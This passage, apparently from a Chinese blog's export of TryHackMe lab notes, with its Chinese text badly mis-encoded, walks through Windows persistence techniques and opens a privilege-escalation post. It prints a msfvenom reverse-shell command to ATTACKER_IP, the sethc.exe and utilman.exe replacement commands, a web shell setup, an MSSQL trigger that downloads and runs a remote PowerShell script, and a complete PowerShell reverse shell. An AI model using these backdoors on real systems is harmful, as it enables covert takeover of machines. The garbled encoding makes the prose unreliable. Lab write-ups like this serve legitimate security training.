æ‰€åšçš„äº‹æƒ…ä¹‹ä¸€æ˜¯æ£€æŸ¥åä¸º UserInitMprLogonScript çš„ç¯å¢ƒå˜é‡ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­¤ç¯å¢ƒå˜é‡å°†ç™»å½•è„šæœ¬åˆ†é…ç»™ç”¨æˆ·ï¼Œè¯¥è„šæœ¬å°†åœ¨ç™»å½•è®¡ç®—æœºæ—¶è¿è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹æœªè®¾ç½®è¯¥å˜é‡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ›å»ºå®ƒå¹¶åˆ†é…æˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•è„šæœ¬ã€‚ è¯·æ³¨æ„ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„ç¯å¢ƒå˜é‡ï¼›å› æ­¤ï¼Œæ‚¨éœ€è¦åˆ†åˆ«ä¸ºæ¯ä¸ªç”¨æˆ·è®¾ç½®åé—¨ã€‚ è®©æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªç”¨äºæ­¤æŠ€æœ¯çš„åå‘ shellï¼š user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe æˆ‘ä»¬å°†åƒä¹‹å‰ä¸€æ ·å°† shell è½¬ç§»åˆ°å—å®³æœºå™¨ä¸Šã€‚ç„¶åæˆ‘ä»¬å¯ä»¥å°† shell å¤åˆ¶åˆ°æˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•ç›®å½•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ C:\\Windows ï¼š C:\\&gt; move revshell.exe C:\\Windows ä¸ºç”¨æˆ·åˆ›å»ºç¯å¢ƒå˜é‡ï¼Œæ‚¨å¯ä»¥è½¬åˆ°æ³¨å†Œè¡¨ä¸­çš„ HKCU\\Environment ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ UserInitMprLogonScript æ¡ç›®æŒ‡å‘æˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥ä¾¿åœ¨ç”¨æˆ·ç™»å½•æ—¶åŠ è½½å®ƒï¼š è¯·æ³¨æ„ï¼Œæ­¤æ³¨å†Œè¡¨é¡¹åœ¨ HKLM ä¸­æ²¡æœ‰ç­‰æ•ˆé¡¹ï¼Œè¿™ä½¿å¾—æ‚¨çš„åé—¨ä»…é€‚ç”¨äºå½“å‰ç”¨æˆ·ã€‚ å®Œæˆæ­¤æ“ä½œåï¼Œé€€å‡ºå½“å‰ä¼šè¯å¹¶å†æ¬¡ç™»å½•ï¼Œæ‚¨åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ª shellï¼ˆå¯èƒ½éœ€è¦å¤§çº¦ 10 ç§’ï¼‰ã€‚ 2.6 ç™»å½•å±å¹•/RDP åé—¨ å¦‚æœæˆ‘ä»¬å¯¹æœºå™¨æœ‰ç‰©ç†è®¿é—®æƒé™ï¼ˆåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­æ˜¯ RDPï¼‰ï¼Œæ‚¨å¯ä»¥åœ¨ç™»å½•å±å¹•åé—¨æ¥è®¿é—®ç»ˆç«¯ï¼Œè€Œæ— éœ€æ‹¥æœ‰æœºå™¨çš„æœ‰æ•ˆå‡­æ®ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ç ”ç©¶ä¸¤ç§ä¾èµ–è¾…åŠ©åŠŸèƒ½çš„æ–¹æ³•ã€‚ Sticky Keys ç²˜æ»é”® å½“æŒ‰ä¸‹ CTRL + ALT + DEL ç­‰ç»„åˆé”®æ—¶ï¼Œæ‚¨å¯ä»¥å°† Windows é…ç½®ä¸ºä½¿ç”¨ç²˜æ»é”®ï¼Œè¿™æ ·æ‚¨å°±å¯ä»¥æŒ‰é¡ºåºè€Œä¸æ˜¯åŒæ—¶æŒ‰ä¸‹ç»„åˆæŒ‰é’®ã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè¯´ï¼Œå¦‚æœç²˜æ»é”®å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥æŒ‰ä¸‹å¹¶é‡Šæ”¾ CTRL ï¼ŒæŒ‰ä¸‹å¹¶é‡Šæ”¾ ALT ï¼Œæœ€åæŒ‰ä¸‹å¹¶é‡Šæ”¾ DEL æ¥å®ç°ç›¸åŒçš„æ•ˆæœæ•ˆæœä¸æŒ‰ CTRL + ALT + DEL ç»„åˆé”®ä¸€æ ·ã€‚ ä¸ºäº†ä½¿ç”¨ç²˜æ»é”®å»ºç«‹æŒä¹…æ€§ï¼Œæˆ‘ä»¬å°†æ»¥ç”¨ä»»ä½• Windows å®‰è£…ä¸­é»˜è®¤å¯ç”¨çš„å¿«æ·æ–¹å¼ï¼Œè¯¥å¿«æ·æ–¹å¼å…è®¸æˆ‘ä»¬é€šè¿‡æŒ‰ SHIFT 5 æ¬¡æ¥æ¿€æ´»ç²˜æ»é”®ã€‚è¾“å…¥å¿«æ·æ–¹å¼åï¼Œæˆ‘ä»¬é€šå¸¸ä¼šçœ‹åˆ°å¦‚ä¸‹æ‰€ç¤ºçš„å±å¹•ï¼š æŒ‰ SHIFT 5 æ¬¡åï¼ŒWindows å°†æ‰§è¡Œ C:\\Windows\\System32\\sethc.exe ä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå°†æ­¤ç±»äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ä¸ºæˆ‘ä»¬åå¥½çš„æœ‰æ•ˆè´Ÿè½½ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¿«æ·æ–¹å¼è§¦å‘å®ƒã€‚æœ‰è¶£çš„æ˜¯ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥åœ¨è¾“å…¥ä»»ä½•å‡­æ®ä¹‹å‰ä»ç™»å½•å±å¹•æ‰§è¡Œæ­¤æ“ä½œã€‚ ç™»å½•å±å¹•åé—¨çš„ä¸€ç§ç®€å•æ–¹æ³•æ˜¯å°† sethc.exe æ›¿æ¢ä¸º cmd.exe çš„å‰¯æœ¬ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç²˜æ»é”®å¿«æ·é”®ç”Ÿæˆæ§åˆ¶å°ï¼Œç”šè‡³å¯ä»¥ä»æ—¥å¿—è®°å½•å±å¹•ä¸­ç”Ÿæˆæ§åˆ¶å°ã€‚ è¦è¦†ç›– sethc.exe ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è·å¾—è¯¥æ–‡ä»¶çš„æ‰€æœ‰æƒå¹¶æˆäºˆå½“å‰ç”¨æˆ·ä¿®æ”¹å®ƒçš„æƒé™ã€‚åªæœ‰è¿™æ ·æˆ‘ä»¬æ‰èƒ½ç”¨ cmd.exe çš„å‰¯æœ¬æ›¿æ¢å®ƒã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åšåˆ°è¿™ä¸€ç‚¹ï¼š æ‰§è¡Œæ­¤æ“ä½œåï¼Œä»å¼€å§‹èœå•é”å®šæ‚¨çš„ä¼šè¯ï¼š æ‚¨ç°åœ¨åº”è¯¥å¯ä»¥æŒ‰äº”æ¬¡ SHIFT ç›´æ¥ä»ç™»å½•å±å¹•è®¿é—®å…·æœ‰ç³»ç»Ÿæƒé™çš„ç»ˆç«¯ï¼š Utilman Utilman æ˜¯ä¸€ä¸ªå†…ç½®çš„ Windows åº”ç”¨ç¨‹åºï¼Œç”¨äºåœ¨é”å®šå±å¹•æœŸé—´æä¾›â€œè½»æ¾è®¿é—®â€é€‰é¡¹ï¼š å½“æˆ‘ä»¬å•å‡»ç™»å½•å±å¹•ä¸Šçš„è½»æ¾è®¿é—®æŒ‰é’®æ—¶ï¼Œå®ƒä¼šä»¥ç³»ç»Ÿæƒé™æ‰§è¡Œ C:\\Windows\\System32\\Utilman.exe ã€‚å¦‚æœæˆ‘ä»¬å°†å…¶æ›¿æ¢ä¸º cmd.exe çš„å‰¯æœ¬ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡ç»•è¿‡ç™»å½•å±å¹•ã€‚ ä¸ºäº†æ›¿æ¢ utilman.exe ï¼Œæˆ‘ä»¬æ‰§è¡Œä¸ sethc.exe ç±»ä¼¼çš„è¿‡ç¨‹ï¼š C:\\&gt; takeown /f c:\\Windows\\System32\\utilman.exe SUCCESS: The file (or folder): \"c:\\Windows\\System32\\utilman.exe\" now owned by user \"PURECHAOS\\Administrator\". C:\\&gt; icacls C:\\Windows\\System32\\utilman.exe /grant Administrator:F processed file: C:\\Windows\\System32\\utilman.exe Successfully processed 1 files; Failed processing 0 files C:\\&gt; copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe Overwrite C:\\Windows\\System32\\utilman.exe? (Yes/No/All): yes 1 file(s) copied. è¦è§¦å‘æˆ‘ä»¬çš„ç»ˆç«¯ï¼Œæˆ‘ä»¬å°†ä»å¼€å§‹æŒ‰é’®é”å®šå±å¹•ï¼š æœ€åï¼Œç»§ç»­å•å‡»â€œè½»æ¾è®¿é—®â€æŒ‰é’®ã€‚ç”±äºæˆ‘ä»¬å°† utilman.exe æ›¿æ¢ä¸º cmd.exe å‰¯æœ¬ï¼Œå› æ­¤æˆ‘ä»¬å°†è·å¾—å…·æœ‰ SYSTEM æƒé™çš„å‘½ä»¤æç¤ºç¬¦ï¼š 2.7 é€šè¿‡ç°æœ‰æœåŠ¡æŒç»­å­˜åœ¨ å¦‚æœæ‚¨ä¸æƒ³ä½¿ç”¨ Windows åŠŸèƒ½æ¥éšè—åé—¨ï¼Œæ‚¨å§‹ç»ˆå¯ä»¥ä»ä»»ä½•å¯ç”¨äºä¸ºæ‚¨è¿è¡Œä»£ç çš„ç°æœ‰æœåŠ¡ä¸­è·ç›Šã€‚æ­¤ä»»åŠ¡å°†æ¢è®¨å¦‚ä½•åœ¨å…¸å‹çš„ Web æœåŠ¡å™¨è®¾ç½®ä¸­æ¤å…¥åé—¨ã€‚å°½ç®¡å¦‚æ­¤ï¼Œæ‚¨å¯¹æ‰§è¡Œå†…å®¹æœ‰ä¸€å®šç¨‹åº¦æ§åˆ¶çš„ä»»ä½•å…¶ä»–åº”ç”¨ç¨‹åºéƒ½åº”è¯¥ç±»ä¼¼åœ°å­˜åœ¨åé—¨ã€‚å¯èƒ½æ€§æ˜¯æ— æ­¢å¢ƒï¼ ä½¿ç”¨ Web Shell åœ¨ Web æœåŠ¡å™¨ä¸­å®ç°æŒä¹…åŒ–çš„å¸¸ç”¨æ–¹æ³•æ˜¯å°† Web shell ä¸Šä¼ åˆ° Web ç›®å½•ã€‚è¿™å¾ˆç®€å•ï¼Œå°†æˆäºˆæˆ‘ä»¬ä½¿ç”¨ IIS ä¸­é…ç½®çš„ç”¨æˆ·çš„æƒé™è¿›è¡Œè®¿é—®ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸º iis apppool\\defaultapppool ã€‚å³ä½¿è¿™æ˜¯ä¸€ä¸ªéç‰¹æƒç”¨æˆ·ï¼Œå®ƒä¹Ÿå…·æœ‰ç‰¹æ®Šçš„ SeImpersonatePrivilege ï¼Œæä¾›äº†ä¸€ç§ä½¿ç”¨å„ç§å·²çŸ¥æ¼æ´å‡çº§åˆ°ç®¡ç†å‘˜çš„ç®€å•æ–¹æ³•ã€‚æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤æƒé™çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Windows Privesc Roomã€‚ è®©æˆ‘ä»¬é¦–å…ˆä¸‹è½½ ASP.NET Web shellï¼ˆhereï¼‰è¿™é‡Œæä¾›äº†ä¸€ä¸ªç°æˆçš„ Web shellï¼Œä½†æ‚¨å¯ä»¥éšæ„ä½¿ç”¨æ‚¨å–œæ¬¢çš„ä»»ä½•ä¸€ä¸ªã€‚å°†å…¶ä¼ è¾“åˆ°å—å®³è®¡ç®—æœºå¹¶å°†å…¶ç§»è‡³ webrootï¼Œé»˜è®¤æƒ…å†µä¸‹ä½äº C:\\inetpub\\wwwroot ç›®å½•ä¸­ï¼š è¿™é‡Œä¾æ—§åœ¨æ”»å‡»æœºä¸Šå¼€å¯httpæœåŠ¡ï¼Œåœ¨å—å®³æœºä¸Šç”¨powershellä¸‹è½½æœ¨é©¬ C:\\&gt; move shell.aspx C:\\inetpub\\wwwroot\\ æ³¨æ„ï¼šæ ¹æ®æ‚¨åˆ›å»º/ä¼ è¾“ shell.aspx çš„æ–¹å¼ï¼Œæ–‡ä»¶ä¸­çš„æƒé™å¯èƒ½ä¸å…è®¸ Web æœåŠ¡å™¨è®¿é—®å®ƒã€‚å¦‚æœæ‚¨åœ¨è®¿é—® shell çš„ URL æ—¶é‡åˆ°â€œæƒé™è¢«æ‹’ç»â€é”™è¯¯ï¼Œåªéœ€æˆäºˆæ¯ä¸ªäººå¯¹è¯¥æ–‡ä»¶çš„å®Œå…¨æƒé™å³å¯ä½¿å…¶æ­£å¸¸å·¥ä½œã€‚æ‚¨å¯ä»¥ä½¿ç”¨ icacls shell.aspx /grant Everyone:F æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚ ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŒ‡å‘ä»¥ä¸‹ URL ä» Web æœåŠ¡å™¨è¿è¡Œå‘½ä»¤ï¼š http://10.10.73.60/shell.aspx ä½¿ç”¨ MSSQL ä½œä¸ºåé—¨ åœ¨ MSSQL Server å®‰è£…ä¸­æ¤å…¥åé—¨çš„æ–¹æ³•æœ‰å¤šç§ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å°†çœ‹çœ‹å…¶ä¸­ä¸€ä¸ªæ»¥ç”¨è§¦å‘å™¨çš„æƒ…å†µã€‚ç®€è€Œè¨€ä¹‹ï¼ŒMSSQL ä¸­çš„è§¦å‘å™¨å…è®¸æ‚¨ç»‘å®šåœ¨æ•°æ®åº“ä¸­å‘ç”Ÿç‰¹å®šäº‹ä»¶æ—¶è¦æ‰§è¡Œçš„æ“ä½œã€‚è¿™äº›äº‹ä»¶çš„èŒƒå›´å¯ä»¥ä»ç”¨æˆ·ç™»å½•åˆ°ä»ç»™å®šè¡¨ä¸­æ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤æ•°æ®ã€‚å¯¹äºæ­¤ä»»åŠ¡ï¼Œæˆ‘ä»¬å°†ä¸º HRDB æ•°æ®åº“ä¸­çš„ä»»ä½• INSERT åˆ›å»ºè§¦å‘å™¨ã€‚ åœ¨åˆ›å»ºè§¦å‘å™¨ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»é¦–å…ˆåœ¨æ•°æ®åº“ä¸Šé‡æ–°é…ç½®ä¸€äº›ä¸œè¥¿ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å¯ç”¨ xp_cmdshell å­˜å‚¨è¿‡ç¨‹ã€‚ xp_cmdshell æ˜¯ä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹ï¼Œåœ¨ä»»ä½• MSSQL å®‰è£…ä¸­é»˜è®¤æä¾›ï¼Œå…è®¸æ‚¨ç›´æ¥åœ¨ç³»ç»Ÿæ§åˆ¶å°ä¸­è¿è¡Œå‘½ä»¤ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹å¤„äºç¦ç”¨çŠ¶æ€ã€‚ è¦å¯ç”¨å®ƒï¼Œè¯·ä»å¼€å§‹èœå•æ‰“å¼€ Microsoft SQL Server Management Studio 18 ã€‚å½“è¦æ±‚è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œåªéœ€ä½¿ç”¨ Windows èº«ä»½éªŒè¯ï¼ˆé»˜è®¤å€¼ï¼‰ï¼Œæ‚¨å°†ä½¿ç”¨å½“å‰ Windows ç”¨æˆ·çš„å‡­æ®ç™»å½•ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæœ¬åœ°ç®¡ç†å‘˜å¸æˆ·å°†æœ‰æƒè®¿é—®æ‰€æœ‰æ•°æ®åº“ã€‚ ç™»å½•åï¼Œå•å‡»â€œæ–°å»ºæŸ¥è¯¢â€æŒ‰é’®æ‰“å¼€æŸ¥è¯¢ç¼–è¾‘å™¨ï¼š è¿è¡Œä»¥ä¸‹ SQL è¯­å¥å¯ç”¨ MSSQL é…ç½®ä¸­çš„â€œé«˜çº§é€‰é¡¹â€ï¼Œç„¶åç»§ç»­å¯ç”¨ xp_cmdshell ã€‚ sp_configure 'Show Advanced Options',1; RECONFIGURE; GO sp_configure 'xp_cmdshell',1; RECONFIGURE; GO ä¹‹åï¼Œæˆ‘ä»¬å¿…é¡»ç¡®ä¿ä»»ä½•è®¿é—®æ•°æ®åº“çš„ç½‘ç«™éƒ½å¯ä»¥è¿è¡Œ xp_cmdshell ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰å…·æœ‰ sysadmin è§’è‰²çš„æ•°æ®åº“ç”¨æˆ·æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œã€‚ç”±äºé¢„è®¡ Web åº”ç”¨ç¨‹åºä¼šä½¿ç”¨å—é™æ•°æ®åº“ç”¨æˆ·ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‘æ‰€æœ‰ç”¨æˆ·æˆäºˆæƒé™æ¥æ¨¡æ‹Ÿ sa ç”¨æˆ·ï¼Œè¿™æ˜¯é»˜è®¤çš„æ•°æ®åº“ç®¡ç†å‘˜ï¼š ä¹‹åï¼Œæˆ‘ä»¬å¿…é¡»ç¡®ä¿ä»»ä½•è®¿é—®æ•°æ®åº“çš„ç½‘ç«™éƒ½å¯ä»¥è¿è¡Œ xp_cmdshell ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰å…·æœ‰ sysadmin è§’è‰²çš„æ•°æ®åº“ç”¨æˆ·æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œã€‚ç”±äºé¢„è®¡ Web åº”ç”¨ç¨‹åºä¼šä½¿ç”¨å—é™æ•°æ®åº“ç”¨æˆ·ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‘æ‰€æœ‰ç”¨æˆ·æˆäºˆæƒé™æ¥æ¨¡æ‹Ÿ sa ç”¨æˆ·ï¼Œè¿™æ˜¯é»˜è®¤çš„æ•°æ®åº“ç®¡ç†å‘˜ï¼š USE master; GRANT IMPERSONATE ON LOGIN::sa to [Public]; å®Œæˆæ‰€æœ‰è¿™äº›ä¹‹åï¼Œæˆ‘ä»¬ç»ˆäºé…ç½®äº†ä¸€ä¸ªè§¦å‘å™¨ã€‚æˆ‘ä»¬é¦–å…ˆæ›´æ”¹ä¸º HRDB æ•°æ®åº“ï¼š USE HRDB; æˆ‘ä»¬çš„è§¦å‘å™¨å°†åˆ©ç”¨ xp_cmdshell æ‰§è¡Œ Powershellï¼Œä»æ”»å‡»è€…æ§åˆ¶çš„ Web æœåŠ¡å™¨ä¸‹è½½å¹¶è¿è¡Œ .ps1 æ–‡ä»¶ã€‚è§¦å‘å™¨å°†é…ç½®ä¸ºæ¯å½“å°† INSERT æ”¾å…¥ HRDB æ•°æ®åº“çš„ Employees è¡¨ä¸­æ—¶æ‰§è¡Œï¼š CREATE TRIGGER [sql_backdoor] ON HRDB.dbo.Employees FOR INSERT AS EXECUTE AS LOGIN = 'sa' EXEC master..xp_cmdshell 'Powershell -c \"IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')\"'; ç°åœ¨åé—¨å·²è®¾ç½®å®Œæ¯•ï¼Œè®©æˆ‘ä»¬åœ¨æ”»å‡»è€…çš„è®¡ç®—æœºä¸­åˆ›å»º evilscript.ps1 ï¼Œå…¶ä¸­å°†åŒ…å« Powershell åå‘ shellï¼š $client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",5555); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() æˆ‘ä»¬éœ€è¦æ‰“å¼€ä¸¤ä¸ªç»ˆç«¯æ¥å¤„ç†æ­¤æ¼æ´åˆ©ç”¨ä¸­æ¶‰åŠçš„è¿æ¥ï¼š è§¦å‘å™¨å°†æ‰§è¡Œç¬¬ä¸€æ¬¡è¿æ¥æ¥ä¸‹è½½å¹¶æ‰§è¡Œ evilscript.ps1 ã€‚æˆ‘ä»¬çš„è§¦å‘å™¨ä½¿ç”¨ç«¯å£ 8000ã€‚ ç¬¬äºŒä¸ªè¿æ¥å°†æ˜¯ç«¯å£ 5555 ä¸Šçš„åå‘ shell è¿”å›åˆ°æˆ‘ä»¬çš„æ”»å‡»è€…è®¡ç®—æœºã€‚ ä¸€åˆ‡å‡†å¤‡å°±ç»ªåï¼Œè®©æˆ‘ä»¬å¯¼èˆªåˆ° http://10.10.73.60/ å¹¶å°†å‘˜å·¥æ’å…¥åˆ° Web åº”ç”¨ç¨‹åºä¸­ã€‚ç”±äº Web åº”ç”¨ç¨‹åºå°†å‘æ•°æ®åº“å‘é€ INSERT è¯­å¥ï¼Œå› æ­¤æˆ‘ä»¬çš„ TRIGGER å°†ä¸ºæˆ‘ä»¬æä¾›å¯¹ç³»ç»Ÿæ§åˆ¶å°çš„è®¿é—®ã€‚ æ‰§è¡Œä¹‹åï¼Œè®¿é—®å—å®³æœºwebç½‘ç«™ å¦‚ä¸Šå›¾ï¼Œæ·»åŠ SQLç”¨æˆ·ï¼Œç‚¹å‡»addï¼Œå³å¯çœ‹åˆ°ä¸‹å›¾ï¼Œæ‹¿åˆ°shell","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Windowsæƒé™æå‡","path":"/2024/02/06/thm-windows-quan-xian-ti-sheng/","content":"0x01 å‰è¨€ æœ€è¿‘åœ¨tryhackmeä¸­å­¦åˆ°äº†Windowsæ¸—é€ç›¸å…³çŸ¥è¯†ï¼Œåœ¨æ­¤ä¹‹å‰å­¦çš„æœ‰äº›ä¸œè¥¿å¿˜è®°è®°å½•äº†ï¼Œä½†å®é™…ä¸Šä¹Ÿæ²¡æœ‰è®°å½•çš„å¿…è¦æ€§ï¼Œæ•…æ­¤ä¸ç®¡äº†ã€‚è¿™é‡Œå°±è®°å½•Windowsææƒçš„æŸäº›çŸ¥è¯†ç‚¹ã€‚ 0x02 ç®€ä»‹ ç®€è€Œè¨€ä¹‹ï¼Œæƒé™å‡çº§åŒ…æ‹¬ä½¿ç”¨â€œç”¨æˆ· Aâ€å¯¹ä¸»æœºçš„ç»™å®šè®¿é—®æƒé™ï¼Œå¹¶é€šè¿‡æ»¥ç”¨ç›®æ ‡ç³»ç»Ÿä¸­çš„å¼±ç‚¹æ¥åˆ©ç”¨å®ƒæ¥è·å¾—å¯¹â€œç”¨æˆ· Bâ€çš„è®¿é—®æƒé™ã€‚è™½ç„¶æˆ‘ä»¬é€šå¸¸å¸Œæœ›â€œç”¨æˆ· Bâ€æ‹¥æœ‰ç®¡ç†æƒé™ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å‡çº§åˆ°å…¶ä»–éç‰¹æƒå¸æˆ·ï¼Œç„¶åæ‰èƒ½çœŸæ­£è·å¾—ç®¡ç†æƒé™ã€‚ è·å¾—å¯¹ä¸åŒå¸æˆ·çš„è®¿é—®æƒé™å°±åƒåœ¨ä¸€äº›ç²—å¿ƒçš„ç”¨æˆ·ç•™ä¸‹çš„ä¸å®‰å…¨çš„æ–‡æœ¬æ–‡ä»¶æˆ–ç”µå­è¡¨æ ¼ä¸­æŸ¥æ‰¾å‡­æ®ä¸€æ ·ç®€å•ï¼Œä½†æƒ…å†µå¹¶éæ€»æ˜¯å¦‚æ­¤ã€‚æ ¹æ®å…·ä½“æƒ…å†µï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åˆ©ç”¨ä»¥ä¸‹ä¸€äº›å¼±ç‚¹ï¼š Windows æœåŠ¡æˆ–è®¡åˆ’ä»»åŠ¡é…ç½®é”™è¯¯ åˆ†é…ç»™æˆ‘ä»¬å¸æˆ·çš„æƒé™è¿‡å¤š æ˜“å—æ”»å‡»çš„è½¯ä»¶ ç¼ºå°‘ Windows å®‰å…¨è¡¥ä¸ åœ¨å¼€å§‹è®¨è®ºå®é™…æŠ€æœ¯ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ Windows ç³»ç»Ÿä¸Šçš„ä¸åŒå¸æˆ·ç±»å‹ã€‚ 0x03 Windowsç”¨æˆ· Windowsç³»ç»Ÿä¸»è¦æœ‰ä¸¤ç±»ç”¨æˆ·ã€‚æ ¹æ®ç”¨æˆ·çš„è®¿é—®çº§åˆ«ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç”¨æˆ·åˆ†ä¸ºä»¥ä¸‹ç»„ä¹‹ä¸€ï¼š Administrators ç®¡ç†å‘˜ è¿™äº›ç”¨æˆ·æ‹¥æœ‰æœ€å¤šçš„æƒé™ã€‚ä»–ä»¬å¯ä»¥æ›´æ”¹ä»»ä½•ç³»ç»Ÿé…ç½®å‚æ•°å¹¶è®¿é—®ç³»ç»Ÿä¸­çš„ä»»ä½•æ–‡ä»¶ã€‚ Standard Users æ ‡å‡†ç”¨æˆ· è¿™äº›ç”¨æˆ·å¯ä»¥è®¿é—®è®¡ç®—æœºï¼Œä½†åªèƒ½æ‰§è¡Œæœ‰é™çš„ä»»åŠ¡ã€‚é€šå¸¸ï¼Œè¿™äº›ç”¨æˆ·æ— æ³•å¯¹ç³»ç»Ÿè¿›è¡Œæ°¸ä¹…æˆ–é‡è¦çš„æ›´æ”¹ï¼Œå¹¶ä¸”ä»…é™äºä»–ä»¬çš„æ–‡ä»¶ã€‚ ä»»ä½•å…·æœ‰ç®¡ç†æƒé™çš„ç”¨æˆ·éƒ½å°†æˆä¸ºç®¡ç†å‘˜ç»„çš„ä¸€éƒ¨åˆ†ã€‚å¦ä¸€æ–¹é¢ï¼Œæ ‡å‡†ç”¨æˆ·æ˜¯ç”¨æˆ·ç»„çš„ä¸€éƒ¨åˆ†ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œæ‚¨é€šå¸¸ä¼šå¬è¯´æ“ä½œç³»ç»Ÿåœ¨æƒé™å‡çº§çš„æƒ…å†µä¸‹ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„å†…ç½®å¸æˆ·ï¼š SYSTEM / LocalSystem ç³»ç»Ÿ/æœ¬åœ°ç³»ç»Ÿ æ“ä½œç³»ç»Ÿç”¨æ¥æ‰§è¡Œå†…éƒ¨ä»»åŠ¡çš„å¸æˆ·ã€‚å®ƒå¯ä»¥å®Œå…¨è®¿é—®ä¸»æœºä¸Šå¯ç”¨çš„æ‰€æœ‰æ–‡ä»¶å’Œèµ„æºï¼Œå¹¶ä¸”å…·æœ‰æ¯”ç®¡ç†å‘˜æ›´é«˜çš„æƒé™ã€‚ Local Service æœ¬åœ°æœåŠ¡ ç”¨äºä»¥â€œæœ€ä½â€æƒé™è¿è¡Œ Windows æœåŠ¡çš„é»˜è®¤å¸æˆ·ã€‚å®ƒå°†ä½¿ç”¨ç½‘ç»œä¸Šçš„åŒ¿åè¿æ¥ã€‚ Network Service ç½‘ç»œæœåŠ¡ ç”¨äºä»¥â€œæœ€ä½â€æƒé™è¿è¡Œ Windows æœåŠ¡çš„é»˜è®¤å¸æˆ·ã€‚å®ƒå°†ä½¿ç”¨è®¡ç®—æœºå‡­æ®é€šè¿‡ç½‘ç»œè¿›è¡Œèº«ä»½éªŒè¯ã€‚ è¿™äº›å¸æˆ·ç”± Windows åˆ›å»ºå’Œç®¡ç†ï¼Œæ‚¨å°†æ— æ³•åƒå…¶ä»–å¸¸è§„å¸æˆ·ä¸€æ ·ä½¿ç”¨å®ƒä»¬ã€‚ä¸è¿‡ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½ä¼šå› ä¸ºåˆ©ç”¨ç‰¹å®šæœåŠ¡è€Œè·å¾—ä»–ä»¬çš„ç‰¹æƒã€‚ 0x03 Windowså¯†ç æ”¶é›† è·å¾—å…¶ä»–ç”¨æˆ·è®¿é—®æƒé™çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä»å—æ„ŸæŸ“çš„è®¡ç®—æœºæ”¶é›†å‡­æ®ã€‚æ­¤ç±»å‡­è¯çš„å­˜åœ¨å¯èƒ½æœ‰å¤šç§åŸå› ï¼ŒåŒ…æ‹¬ç²—å¿ƒçš„ç”¨æˆ·å°†å…¶ç•™åœ¨æ˜æ–‡æ–‡ä»¶ä¸­ï¼›ç”šè‡³ç”±æµè§ˆå™¨æˆ–ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ç­‰è½¯ä»¶å­˜å‚¨ã€‚ 3.1 Windows installations åœ¨å¤§é‡ä¸»æœºä¸Šå®‰è£… Windows 